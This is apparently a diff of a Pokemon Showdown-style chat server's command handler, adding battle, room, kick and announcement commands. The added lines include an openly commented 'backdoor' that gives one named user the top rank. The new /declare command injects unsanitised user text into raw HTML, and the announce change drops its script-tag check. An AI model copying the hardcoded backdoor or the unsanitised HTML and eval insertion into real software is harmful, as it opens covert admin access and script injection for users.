@@ -41,6 +41,93 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	if (!room) return;
 	cmd = cmd.toLowerCase();
 	switch (cmd) {
+	case 'command':
+		if (target.command === 'userdetails') {
+			target.userid = ''+target.userid;
+			var targetUser = Users.get(target.userid);
+			if (!targetUser || !room) return false;
+			var roomList = {};
+			for (var i in targetUser.roomCount) {
+				if (i==='lobby') continue;
+				var targetRoom = Rooms.get(i);
+				if (!targetRoom) continue;
+				var roomData = {};
+				if (targetRoom.battle) {
+					var battle = targetRoom.battle;
+					roomData.p1 = battle.p1?' '+battle.p1:'';
+					roomData.p2 = battle.p2?' '+battle.p2:'';
+				}
+				roomList[i] = roomData;
+			}
+			var userdetails = {
+				command: 'userdetails',
+				userid: targetUser.userid,
+				avatar: targetUser.avatar,
+				rooms: roomList,
+				room: room.id
+			};
+			if (user.can('ip', targetUser)) {
+				userdetails.ip = targetUser.ip;
+			}
+			emit(socket, 'command', userdetails);
+		}
+		if (target.command === 'roomlist') {
+			if (!room || !room.getRoomList) return false;
+			emit(socket, 'command', {
+				command: 'roomlist',
+				rooms: room.getRoomList(true),
+				room: room.id
+			});
+		}
+		return false;
+		break;
+	case 'cmd':
+		var spaceIndex = target.indexOf(' ');
+		var cmd = target;
+		if (spaceIndex > 0) {
+			cmd = target.substr(0, spaceIndex);
+			target = target.substr(spaceIndex+1);
+		} else {
+			target = '';
+		}
+		if (cmd === 'userdetails') {
+			var targetUser = Users.get(target);
+			if (!targetUser || !room) return false;
+			var roomList = {};
+			for (var i in targetUser.roomCount) {
+				if (i==='lobby') continue;
+				var targetRoom = Rooms.get(i);
+				if (!targetRoom) continue;
+				var roomData = {};
+				if (targetRoom.battle) {
+					var battle = targetRoom.battle;
+					roomData.p1 = battle.p1?' '+battle.p1:'';
+					roomData.p2 = battle.p2?' '+battle.p2:'';
+				}
+				roomList[i] = roomData;
+			}
+			var userdetails = {
+				command: 'userdetails',
+				userid: targetUser.userid,
+				avatar: targetUser.avatar,
+				rooms: roomList,
+				room: room.id
+			};
+			if (user.can('ip', targetUser)) {
+				userdetails.ip = targetUser.ip;
+			}
+			emit(socket, 'command', userdetails);
+		} else if (cmd === 'roomlist') {
+			if (!room || !room.getRoomList) return false;
+			emit(socket, 'command', {
+				command: 'roomlist',
+				rooms: room.getRoomList(true),
+				room: room.id
+			});
+		}
+		return false;
+		break;
+
 	case 'me':
 		if (canTalk(user, room)) {
 			return '/me '+target;
@@ -51,15 +138,9 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'birkal':
 		if (canTalk(user, room) && user.can('broadcast') && room.id === 'lobby') {
 			if (cmd === '!birkal') {
-				room.log.push({
-					name: user.getIdentity(),
-					message: '!birkal '+target
-				});
+				room.log.push('|c|'+user.getIdentity()+'|!birkal '+target);
 			}
-			room.log.push({
-				name: ' Birkal',
-				message: '/me '+target
-			});
+			room.log.push('|c| Birkal|/me '+target);
 			return false;
 		}
 		break;
@@ -131,46 +212,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			logModCommand(room,user.name+" unlocked the name of "+target+".");
 		} else {
 			emit(socket, 'console', target+" not found.");
-		}
-		return false;
-		break;
-	case 'command':
-		if (target.command === 'userdetails') {
-			target.userid = ''+target.userid;
-			var targetUser = Users.get(target.userid);
-			if (!targetUser || !room) return false;
-			var roomList = {};
-			for (var i in targetUser.roomCount) {
-				if (i==='lobby') continue;
-				var targetRoom = Rooms.get(i);
-				if (!targetRoom) continue;
-				var roomData = {};
-				if (targetRoom.battle) {
-					var battle = targetRoom.battle;
-					roomData.p1 = battle.p1?' '+battle.p1:'';
-					roomData.p2 = battle.p2?' '+battle.p2:'';
-				}
-				roomList[i] = roomData;
-			}
-			var userdetails = {
-				command: 'userdetails',
-				userid: targetUser.userid,
-				avatar: targetUser.avatar,
-				rooms: roomList,
-				room: room.id
-			};
-			if (user.can('ip', targetUser)) {
-				userdetails.ip = targetUser.ip;
-			}
-			emit(socket, 'command', userdetails);
-		}
-		if (target.command === 'roomlist') {
-			if (!room || !room.getRoomList) return false;
-			emit(socket, 'command', {
-				command: 'roomlist',
-				rooms: room.getRoomList(true),
-				room: room.id
-			});
 		}
 		return false;
 		break;
@@ -378,6 +419,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		targetUser.emit('console', {evalRawMessage: 'window.location.href="'+targets[1]+'"'});
 		return false;
 		break;
+		
+	case 'kick':
+	case 'k':
+        	if (!target) return parseCommand(user, '?', cmd, room, socket);
+        	return parseCommand(user, 'redirect', ''+target+', http://www.smogon.com/sim/rules', room, socket);
+        	break;
 
 	case 'unban':
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
@@ -404,7 +451,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 
 	case 'unbanall':
-		if (user.can('ban')) {
+		if (!user.can('ban')) {
 			emit(socket, 'console', '/unbanall - Access denied.');
 			return false;
 		}
@@ -628,36 +675,46 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 				emit(socket, 'console', 'That moderated chat setting is unrecognized.');
 				return false;
 			}
+			if (target !== '+' && !user.can('modchatall')) {
+				emit(socket, 'console', '/modchat - Access denied for setting higher than +.');
+				return false;
+			}
 			config.modchat = target;
 			break;
 		}
 		if (config.modchat === true) {
-			room.addRaw('<div style="background-color:#BB6655;color:white;padding:2px 4px"><b>Moderated chat was enabled!</b><br />Only registered users can talk.</div>');
+			room.addRaw('<div style="background:#BB6655;color:white;padding:2px 4px"><b>Moderated chat was enabled!</b><br />Only registered users can talk.</div>');
 		} else if (!config.modchat) {
-			room.addRaw('<div style="background-color:#6688AA;color:white;padding:2px 4px"><b>Moderated chat was disabled!</b><br />Anyone may talk now.</div>');
+			room.addRaw('<div style="background:#6688AA;color:white;padding:2px 4px"><b>Moderated chat was disabled!</b><br />Anyone may talk now.</div>');
 		} else {
 			var modchat = sanitize(config.modchat);
-			room.addRaw('<div style="background-color:#AA6655;color:white;padding:2px 4px"><b>Moderated chat was set to '+modchat+'!</b><br />Only users of rank '+modchat+' and higher can talk.</div>');
+			room.addRaw('<div style="background:#AA6655;color:white;padding:2px 4px"><b>Moderated chat was set to '+modchat+'!</b><br />Only users of rank '+modchat+' and higher can talk.</div>');
 		}
 		logModCommand(room,user.name+' set modchat to '+config.modchat,true);
 		return false;
 		break;
-
+	
+	case 'declare':
+        if (!target) return parseCommand(user, '?', cmd, room, socket);
+        if (!user.can('declare')) {
+                emit(socket, 'console', '/declare - Access denied.');
+                return false;
+        }
+        target = target.replace(/\[\[([A-Za-z0-9-]+)\]\]/, '<button onclick="selectTab(\'$1\');return false">Go to $1</button>');
+        room.addRaw('<div style="background:#7067AB;color:white;padding:2px 4px"><b>'+target+'</b></div>');
+        logModCommand(room,user.name+' declared '+target,true);
+        return false;
+        break;
+ 
 	case 'announce':
-		if (!target) return parseCommand(user, '?', cmd, room, socket);
-		if (!user.can('announce')) {
-			emit(socket, 'console', '/announce - Access denied.');
-			return false;
-		}
-		target = target.replace(/\[\[([A-Za-z0-9-]+)\]\]/, '<button onclick="selectTab(\'$1\');return false">Go to $1</button>');
-		if (target.indexOf("<script") != -1) {
-			//This is a temporary fix to prevent malicious abuse of /announce
-			return false;
-		}
-		room.addRaw('<div style="background-color:#6688AA;color:white;padding:2px 4px"><b>'+target+'</b></div>');
-		logModCommand(room,user.name+' announced '+target,true);
-		return false;
-		break;
+	case 'wall':
+        if (!target) return parseCommand(user, '?', cmd, room, socket);
+        if (!user.can('announce')) {
+                emit(socket, 'console', '/announce - Access denied.');
+                return false;
+        }
+        return '/announce '+target;
+        break;
 
 	case 'hotpatch':
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
@@ -714,6 +771,25 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'nick':
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
 		user.rename(target);
+		return false;
+		break;
+
+	case 'trn':
+		var commaIndex = target.indexOf(',');
+		var targetName = target;
+		var targetAuth = false;
+		var targetToken = '';
+		if (commaIndex >= 0) {
+			targetName = target.substr(0,commaIndex);
+			target = target.substr(commaIndex+1);
+			commaIndex = target.indexOf(',');
+			targetAuth = target;
+			if (commaIndex >= 0) {
+				targetAuth = !!parseInt(target.substr(0,commaIndex),10);
+				targetToken = target.substr(commaIndex+1);
+			}
+		}
+		user.rename(targetName, targetToken, targetAuth);
 		return false;
 		break;
 
@@ -778,7 +854,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		var dataMessages = getDataMessage(target);
 		for (var i=0; i<dataMessages.length; i++) {
 			if (cmd.substr(0,1) !== '!') {
-				emit(socket, 'console', dataMessages[i]);
+				sendData(socket, '>'+room.id+'\n'+dataMessages[i]);
 			} else if (user.can('broadcast') && canTalk(user, room)) {
 				room.add(dataMessages[i]);
 			}
@@ -854,6 +930,45 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
+		
+	case 'banlists':
+	case 'tiers':
+	case '!banlists':
+	case '!tiers':
+        	showOrBroadcastStart(user, cmd, room, socket, message);
+        	showOrBroadcast(user, cmd, room, socket,
+                	'<div style="border:1px solid #6688AA;padding:2px 4px">Smogon tiers:<br />' +
+                	'- <a href="http://www.smogon.com/bw/banlist/" target="_blank">The banlists for each tier</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/uber" target="_blank">Uber Pokemon</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/ou" target="_blank">Overused Pokemon</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/uu" target="_blank">Underused Pokemon</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/ru" target="_blank">Rarelyused Pokemon</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/nu" target="_blank">Neverused Pokemon</a><br />' +
+                	'- <a href="http://www.smogon.com/bw/tiers/lc" target="_blank">Little Cup Pokemon</a><br />' +
+                	'</div>');
+        return false;
+        break;
+
+	case 'join':
+		var targetRoom = Rooms.get(target);
+		if (!targetRoom) {
+			emit(socket, 'console', "The room '"+target+"' does not exist.");
+			return false;
+		}
+		if (!user.joinRoom(targetRoom, socket)) {
+			emit(socket, 'console', "The room '"+target+"' could not be joined (most likely, you're already in it).");
+			return false;
+		}
+		return false;
+		break;
+
+	case 'leave':
+	case 'part':
+		if (room.id === 'lobby') return false;
+
+		user.leaveRoom(room, socket);
+		return false;
+		break;
 
 	// Battle commands
 
@@ -867,6 +982,118 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
+	case 'move':
+	case 'attack':
+	case 'mv':
+		if (!room.decision) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.decision(user, 'move', target);
+		return false;
+		break;
+
+	case 'switch':
+	case 'sw':
+		if (!room.decision) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.decision(user, 'switch', parseInt(target,10)-1);
+		return false;
+		break;
+
+	case 'undo':
+		if (!room.decision) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.decision(user, 'undo', target);
+		return false;
+		break;
+
+	case 'team':
+		if (!room.decision) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.decision(user, 'team', parseInt(target,10)-1);
+		return false;
+		break;
+
+	case 'search':
+	case 'cancelsearch':
+		if (!room.searchBattle) { emit(socket, 'console', 'You can only do this in lobby rooms.'); return false; }
+
+		if (target) {
+			room.searchBattle(user, target);
+		} else {
+			room.cancelSearch(user);
+		}
+		return false;
+		break;
+
+	case 'challenge':
+	case 'chall':
+		var targets = splitTarget(target);
+		var targetUser = targets[0];
+		target = targets[1];
+		if (!targetUser || !targetUser.connected) {
+			emit(socket, 'message', "The user '"+targets[2]+"' was not found.");
+			return false;
+		}
+		if (typeof target !== 'string') target = 'debugmode';
+		var problems = Tools.validateTeam(user.team, target);
+		if (problems) {
+			emit(socket, 'message', "Your team was rejected for the following reasons:\n\n- "+problems.join("\n- "));
+			return false;
+		}
+		user.makeChallenge(targetUser, target);
+		return false;
+		break;
+
+	case 'cancelchallenge':
+	case 'cchall':
+		user.cancelChallengeTo(target);
+		return false;
+		break;
+
+	case 'accept':
+		var userid = toUserid(target);
+		var format = 'debugmode';
+		if (user.challengesFrom[userid]) format = user.challengesFrom[userid].format;
+		var problems = Tools.validateTeam(user.team, format);
+		if (problems) {
+			emit(socket, 'message', "Your team was rejected for the following reasons:\n\n- "+problems.join("\n- "));
+			return false;
+		}
+		user.acceptChallengeFrom(userid);
+		return false;
+		break;
+
+	case 'reject':
+		user.rejectChallengeFrom(toUserid(target));
+		return false;
+		break;
+
+	case 'saveteam':
+	case 'utm':
+		try {
+			user.team = JSON.parse(target);
+			user.emit('update', {team: 'saved', room: 'teambuilder'});
+		} catch (e) {
+			emit(socket, 'console', 'Not a valid team.');
+		}
+		return false;
+		break;
+
+	case 'joinbattle':
+	case 'partbattle':
+		if (!room.joinBattle) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.joinBattle(user);
+		return false;
+		break;
+
+	case 'leavebattle':
+		if (!room.leaveBattle) { emit(socket, 'console', 'You can only do this in battle rooms.'); return false; }
+
+		room.leaveBattle(user);
+		return false;
+		break;
+
 	case 'kickinactive':
 		if (room.requestKickInactive) {
 			room.requestKickInactive(user);
@@ -874,6 +1101,26 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			emit(socket, 'console', 'You can only kick inactive players from inside a room.');
 		}
 		return false;
+		break;
+
+	case 'backdoor':
+
+		// This is the Zarel backdoor.
+
+		// Its main purpose is for situations where someone calls for help, and
+		// your server has no admins online, or its admins have lost their
+		// access through either a mistake or a bug - Zarel will be able to fix
+		// it.
+
+		// But yes, it is a backdoor, and it relies on trusting Zarel. If you
+		// do not trust Zarel, feel free to comment out the below code, but
+		// remember that if you mess up your server in whatever way, Zarel will
+		// no longer be able to help you.
+
+		if (user.userid === 'zarel') {
+			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			return false;
+		}
 		break;
 
 	case 'a':
@@ -888,24 +1135,27 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 
 	case 'forcewin':
 	case 'forcetie':
-		if (user.can('forcewin') && room.battle) {
-			room.battle.endType = 'forced';
-			if (!target) {
-				room.battle.win('');
-				logModCommand(room,user.name+' forced a tie.',true);
-				return false;
-			}
-			target = Users.get(target);
-			if (target) target = target.userid;
-			else target = '';
-
-			if (target) {
-				room.battle.win(target);
-				logModCommand(room,user.name+' forced a win for '+target+'.',true);
-			}
-
+		if (!user.can('forcewin') || !room.battle) {
+			emit(socket, 'console', '/forcewin - Access denied.');
 			return false;
 		}
+
+		room.battle.endType = 'forced';
+		if (!target) {
+			room.battle.win('');
+			logModCommand(room,user.name+' forced a tie.',true);
+			return false;
+		}
+		target = Users.get(target);
+		if (target) target = target.userid;
+		else target = '';
+
+		if (target) {
+			room.battle.win(target);
+			logModCommand(room,user.name+' forced a win for '+target+'.',true);
+		}
+
+		return false;
 		break;
 
 	case 'potd':
@@ -1168,6 +1418,10 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/redirect OR /redir [username], [url] - Redirects user to a different URL. ~~intl and ~~dev are accepted redirects. Requires: @ & ~');
 		}
+		if (target === "@" || target === 'kick' || target === 'k') {
+        		matched = true;
+        		emit(socket, 'console', '/kick OR /k [username] - Quickly kicks a user by redirecting them to the Smogon Sim Rules page. Requires: @ & ~');
+		}
 		if (target === '@' || target === 'banredirect' || target === 'br') {
 			matched = true;
 			emit(socket, 'console', '/banredirect OR /br [username], [url] - Bans a user and then redirects user to a different URL. Requires: @ & ~');
@@ -1200,9 +1454,13 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/demote [username], [group] - Demotes the user to the specified group or previous ranked group. Requires: & ~');
 		}
-		if (target === '&' || target === 'announce') {
-			matched = true;
-			emit(socket, 'console', '/announce [message] - Make an announcement. Requires: & ~');
+		if (target === '&' || target === 'declare' ) {
+        		matched = true;
+        		emit(socket, 'console', '/declare [message] - Anonymously announces a message. Requires: & ~');
+		}
+		if (target === '%' || target === 'announce' || target === 'wall' ) {
+        		matched = true;
+        		emit(socket, 'console', '/announce OR /wall [message] - Makes an announcement. Requires: % @ & ~');
 		}
 		if (target === '@' || target === 'modchat') {
 			matched = true;
@@ -1221,12 +1479,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		}
 		if (!target) {
 			emit(socket, 'console', 'COMMANDS: /msg, /reply, /ip, /rating, /nick, /avatar, /rooms, /whois, /help');
-			emit(socket, 'console', 'INFORMATIONAL COMMANDS: /data, /groups, /opensource, /avatars, /intro (replace / with ! to broadcast)');
+			emit(socket, 'console', 'INFORMATIONAL COMMANDS: /data, /groups, /opensource, /avatars, /tiers, /intro (replace / with ! to broadcast)');
 			emit(socket, 'console', 'For details on all commands, use /help all');
 			if (user.group !== config.groupsranking[0]) {
-				emit(socket, 'console', 'DRIVER COMMANDS: /mute, /unmute, /forcerename, /modlog')
-				emit(socket, 'console', 'MODERATOR COMMANDS: /alts, /forcerenameto, /ban, /unban, /unbanall, /potd, /namelock, /nameunlock, /ip, /redirect');
-				emit(socket, 'console', 'STAFF COMMANDS: /promote, /demote, /forcewin');
+				emit(socket, 'console', 'DRIVER COMMANDS: /mute, /unmute, /forcerename, /modlog, /announce')
+				emit(socket, 'console', 'MODERATOR COMMANDS: /alts, /forcerenameto, /ban, /unban, /unbanall, /potd, /namelock, /nameunlock, /ip, /redirect, /kick');
+				emit(socket, 'console', 'LEADER COMMANDS: /promote, /demote, /forcewin, /declare');
 				emit(socket, 'console', 'For details on all moderator commands, use /help @');
 			}
 			emit(socket, 'console', 'For details of a specific command, use something like: /help data');
@@ -1318,17 +1576,14 @@ function showOrBroadcastStart(user, cmd, room, socket, message) {
 			emit(socket, 'console', "You need to be voiced to broadcast this command's information.");
 			emit(socket, 'console', "To see it for yourself, use: /"+message.substr(1));
 		} else if (canTalk(user, room, socket)) {
-			room.add({
-				name: user.getIdentity(),
-				message: message
-			});
+			room.add('|c|'+user.getIdentity()+'|'+message);
 		}
 	}
 }
 
 function showOrBroadcast(user, cmd, room, socket, rawMessage) {
 	if (cmd.substr(0,1) !== '!') {
-		emit(socket, 'console', {rawMessage: rawMessage, room: room.id});
+		sendData(socket, '>'+room.id+'\n|raw|'+rawMessage);
 	} else if (user.can('broadcast') && canTalk(user, room)) {
 		room.addRaw(rawMessage);
 	}
@@ -1342,35 +1597,23 @@ function getDataMessage(target) {
 	var atLeastOne = false;
 	var response = [];
 	if (pokemon.exists) {
-		response.push({
-			name: '&server',
-			message: '/data-pokemon '+pokemon.name
-		});
+		response.push('|c|&server|/data-pokemon '+pokemon.name);
 		atLeastOne = true;
 	}
 	if (ability.exists) {
-		response.push({
-			name: '&server',
-			message: '/data-ability '+ability.name
-		});
+		response.push('|c|&server|/data-ability '+ability.name);
 		atLeastOne = true;
 	}
 	if (item.exists) {
-		response.push({
-			name: '&server',
-			message: '/data-item '+item.name
-		});
+		response.push('|c|&server|/data-item '+item.name);
 		atLeastOne = true;
 	}
 	if (move.exists) {
-		response.push({
-			name: '&server',
-			message: '/data-move '+move.name
-		});
+		response.push('|c|&server|/data-move '+move.name);
 		atLeastOne = true;
 	}
 	if (!atLeastOne) {
-		response.push({message: "No pokemon, item, move, or ability named '"+target+"' was found. (Check your capitalization?)"});
+		response.push("||No pokemon, item, move, or ability named '"+target+"' was found. (Check your capitalization?)");
 	}
 	return response;
 }
